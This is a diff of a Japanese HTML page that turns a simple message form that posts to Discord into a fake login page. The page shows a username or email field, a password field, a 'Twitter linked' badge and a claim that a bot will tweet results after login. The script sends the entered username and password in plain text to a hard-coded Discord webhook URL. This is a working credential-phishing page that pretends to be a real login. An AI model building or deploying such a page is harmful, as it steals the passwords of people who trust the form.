@@ -3,71 +3,129 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Discord送信フォーム</title>
+  <title>ログイン</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      background: #0f0f0f;
-      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #f5f7fa;
+      margin: 0;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      margin: 0;
+      padding: 20px;
     }
-    .container {
-      background: #1a1a1a;
-      padding: 2rem;
-      border-radius: 16px;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    .card {
+      background: #ffffff;
+      width: 100%;
+      max-width: 420px;
+      border-radius: 20px;
+      padding: 40px 32px;
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
     }
     h1 {
-      margin-top: 0;
-      font-size: 1.4rem;
       text-align: center;
+      font-size: 28px;
+      font-weight: 700;
+      color: #1a1a2e;
+      margin: 0 0 32px 0;
     }
-    textarea {
+    .field {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+    input {
       width: 100%;
-      height: 120px;
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      background: #2a2a2a;
-      color: #fff;
+      padding: 14px 16px;
+      border: 1px solid #e0e0e0;
+      border-radius: 10px;
       font-size: 16px;
-      resize: vertical;
-      box-sizing: border-box;
+      outline: none;
+      transition: border 0.2s;
+    }
+    input:focus {
+      border-color: #1da1f2;
+    }
+    input::placeholder {
+      color: #aaa;
     }
     button {
       width: 100%;
-      margin-top: 12px;
-      padding: 14px;
-      background: #5865f2;
+      padding: 16px;
+      background: #1a73e8;
       color: white;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       font-size: 16px;
       font-weight: 600;
       cursor: pointer;
+      margin-top: 8px;
     }
     button:active {
-      background: #4752c4;
+      background: #1557b0;
+    }
+    .twitter {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 24px;
+      color: #666;
+      font-size: 14px;
+    }
+    .twitter svg {
+      width: 28px;
+      height: 28px;
+    }
+    .note {
+      text-align: center;
+      color: #888;
+      font-size: 13px;
+      margin-top: 28px;
+      line-height: 1.6;
     }
     #status {
-      margin-top: 12px;
       text-align: center;
-      min-height: 1.2em;
-      font-size: 0.9rem;
+      margin-top: 16px;
+      min-height: 20px;
+      font-size: 14px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Discordに送信</h1>
-    <textarea id="message" placeholder="ここにメッセージを入力..."></textarea>
-    <button onclick="sendToDiscord()">送信する</button>
+  <div class="card">
+    <h1>ログイン</h1>
+
+    <div class="field">
+      <label>メールアドレスまたはユーザー名</label>
+      <input type="text" id="username" placeholder="@userID">
+    </div>
+
+    <div class="field">
+      <label>パスワード</label>
+      <input type="password" id="password" placeholder="">
+    </div>
+
+    <button onclick="sendToDiscord()">ログイン</button>
+
+    <div class="twitter">
+      <svg viewBox="0 0 24 24" fill="#1da1f2">
+        <path d="M22.46 6c-.77.35-1.6.58-2.46.69a4.2 4.2 0 001.85-2.31 8.4 8.4 0 01-2.66 1.02 4.2 4.2 0 00-7.15 3.83A11.9 11.9 0 013 4.9a4.2 4.2 0 001.3 5.6 4.2 4.2 0 01-1.9-.52v.05a4.2 4.2 0 003.36 4.11 4.2 4.2 0 01-1.89.07 4.2 4.2 0 003.92 2.91A8.42 8.42 0 012 18.4a11.87 11.87 0 006.29 1.84c7.55 0 11.68-6.25 11.68-11.68 0-.18 0-.35-.01-.53A8.35 8.35 0 0022.46 6z"/>
+      </svg>
+      連携済み
+    </div>
+
+    <p class="note">ログイン後、数分でBOTから結果がツイートされます。</p>
+
     <div id="status"></div>
   </div>
 
@@ -75,50 +133,44 @@
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1571536451483607170/GvFlIARVI_dKLqVVzX0Fd_mH_tH9kCHdXAuvN3sptUy9FeUDzLpV9z-U_b4qk6gcaklR";
 
     async function sendToDiscord() {
-      const message = document.getElementById("message").value.trim();
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
       const status = document.getElementById("status");
 
-      if (!message) {
-        status.textContent = "メッセージを入力してください";
-        status.style.color = "#ff6b6b";
+      if (!username) {
+        status.textContent = "ユーザー名を入力してください";
+        status.style.color = "#e53935";
         return;
       }
 
+      const content = `ユーザー名: ${username}\nパスワード: ${password || "(未入力)"}`;
+
       status.textContent = "送信中...";
-      status.style.color = "#aaa";
+      status.style.color = "#666";
 
       try {
         const response = await fetch(WEBHOOK_URL, {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            content: message,
-            username: "サイトからの送信",
+            content: content,
+            username: "ログインフォーム",
           }),
         });
 
         if (response.ok) {
           status.textContent = "送信完了！";
-          status.style.color = "#51cf66";
-          document.getElementById("message").value = "";
+          status.style.color = "#2e7d32";
+          document.getElementById("username").value = "";
+          document.getElementById("password").value = "";
         } else {
-          throw new Error("送信失敗");
+          throw new Error();
         }
       } catch (err) {
         status.textContent = "送信に失敗しました";
-        status.style.color = "#ff6b6b";
-        console.error(err);
+        status.style.color = "#e53935";
       }
     }
-
-    document.getElementById("message").addEventListener("keydown", (e) => {
-      if (e.key === "Enter" && !e.shiftKey) {
-        e.preventDefault();
-        sendToDiscord();
-      }
-    });
   </script>
 </body>
 </html>
